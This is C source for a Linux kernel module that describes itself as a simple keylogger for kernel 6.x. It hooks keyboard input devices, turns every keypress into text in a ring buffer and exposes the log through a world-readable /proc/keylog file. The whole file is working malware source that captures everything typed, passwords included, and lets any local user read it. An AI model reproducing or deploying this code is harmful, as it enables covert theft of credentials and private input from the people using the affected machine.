#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/string.h>

#define LOG_BUF_SIZE 4096

static char *log_buffer;
static size_t log_size = 0;

static struct proc_dir_entry *proc_entry;

/*
 * Таблица keycode → ASCII
 */
static const char *keycode_map[256] = {
    [KEY_ESC] = "<ESC>",
    [KEY_1] = "1", [KEY_2] = "2", [KEY_3] = "3", [KEY_4] = "4",
    [KEY_5] = "5", [KEY_6] = "6", [KEY_7] = "7", [KEY_8] = "8",
    [KEY_9] = "9", [KEY_0] = "0",
    [KEY_MINUS] = "-", [KEY_EQUAL] = "=",
    [KEY_BACKSPACE] = "<BS>",
    [KEY_TAB] = "<TAB>",
    [KEY_Q] = "q", [KEY_W] = "w", [KEY_E] = "e", [KEY_R] = "r",
    [KEY_T] = "t", [KEY_Y] = "y", [KEY_U] = "u", [KEY_I] = "i",
    [KEY_O] = "o", [KEY_P] = "p",
    [KEY_A] = "a", [KEY_S] = "s", [KEY_D] = "d", [KEY_F] = "f",
    [KEY_G] = "g", [KEY_H] = "h", [KEY_J] = "j", [KEY_K] = "k",
    [KEY_L] = "l",
    [KEY_Z] = "z", [KEY_X] = "x", [KEY_C] = "c", [KEY_V] = "v",
    [KEY_B] = "b", [KEY_N] = "n", [KEY_M] = "m",
    [KEY_SPACE] = " ",
    [KEY_ENTER] = "\n",
};

/*
 * Добавление строки в буфер
 */
static void log_append(const char *msg)
{
    size_t len = strlen(msg);

    if (log_size + len >= LOG_BUF_SIZE) {
        // кольцевой буфер: сдвигаем влево
        memmove(log_buffer, log_buffer + len, LOG_BUF_SIZE - len);
        log_size = LOG_BUF_SIZE - len;
    }

    memcpy(log_buffer + log_size, msg, len);
    log_size += len;
}

/*
 * Обработчик input событий
 */
static void keylogger_event(struct input_handle *handle,
                            unsigned int type, unsigned int code, int value)
{
    if (type != EV_KEY || value != 1) return;

    if (keycode_map[code]) {
        log_append(keycode_map[code]);
    } else {
        char tmp[16];
        snprintf(tmp, sizeof(tmp), "<%u>", code);
        log_append(tmp);
    }
}

/*
 * Проверка: наше ли устройство
 */
static bool keylogger_match(struct input_handler *handler,
                            struct input_dev *dev)
{
    if (!dev->name)
        return false;

    return strstr(dev->name, "kbd") ||
           strstr(dev->name, "Keyboard") ||
           strstr(dev->name, "keyboard");
}

/*
 * Подключение к устройству
 */
static int keylogger_connect(struct input_handler *handler,
                             struct input_dev *dev,
                             const struct input_device_id *id)
{
    struct input_handle *handle;
    int err;

    handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
    if (!handle)
        return -ENOMEM;

    handle->dev = dev;
    handle->handler = handler;
    handle->name = "keylogger";

    err = input_register_handle(handle);
    if (err) {
        kfree(handle);
        return err;
    }

    err = input_open_device(handle);
    if (err) {
        input_unregister_handle(handle);
        kfree(handle);
        return err;
    }

    pr_info("keylogger: connected to %s\n", dev->name);

    return 0;
}

/*
 * Отключение
 */
static void keylogger_disconnect(struct input_handle *handle)
{
    input_close_device(handle);
    input_unregister_handle(handle);
    kfree(handle);
}

/*
 * Таблица идентификаторов
 */
static const struct input_device_id keylogger_ids[] = {
    {
        .flags = INPUT_DEVICE_ID_MATCH_EVBIT,
        .evbit = { BIT_MASK(EV_KEY) },
    },
    { }
};
MODULE_DEVICE_TABLE(input, keylogger_ids);

/*
 * Хэндлер
 */
static struct input_handler keylogger_handler = {
    .event = keylogger_event,
    .connect = keylogger_connect,
    .disconnect = keylogger_disconnect,
    .name = "keylogger",
    .id_table = keylogger_ids,
    .match = keylogger_match,
};

/*
 * Чтение из /proc/keylog
 */
static ssize_t proc_read(struct file *file, char __user *buf,
                         size_t count, loff_t *ppos)
{
    return simple_read_from_buffer(buf, count, ppos,
                                   log_buffer, log_size);
}

/*
 * proc_ops для ядер 5.6+
 */
static const struct proc_ops proc_fops = {
    .proc_read = proc_read,
};

/*
 * Инициализация модуля
 */
static int __init keylogger_init(void)
{
    log_buffer = kzalloc(LOG_BUF_SIZE, GFP_KERNEL);
    if (!log_buffer)
        return -ENOMEM;

    proc_entry = proc_create("keylog", 0444, NULL, &proc_fops);
    if (!proc_entry) {
        pr_err("keylogger: cannot create /proc entry\n");
        kfree(log_buffer);
        return -ENOMEM;
    }

    if (input_register_handler(&keylogger_handler)) {
        pr_err("keylogger: input_register_handler failed\n");
        proc_remove(proc_entry);
        kfree(log_buffer);
        return -EINVAL;
    }

    pr_info("keylogger: loaded successfully\n");

    return 0;
}

/*
 * Выгрузка
 */
static void __exit keylogger_exit(void)
{
    input_unregister_handler(&keylogger_handler);
    proc_remove(proc_entry);
    kfree(log_buffer);

    pr_info("keylogger: unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Aleksey Pardaev");
MODULE_DESCRIPTION("Simple keylogger module for Linux kernel 6.x");
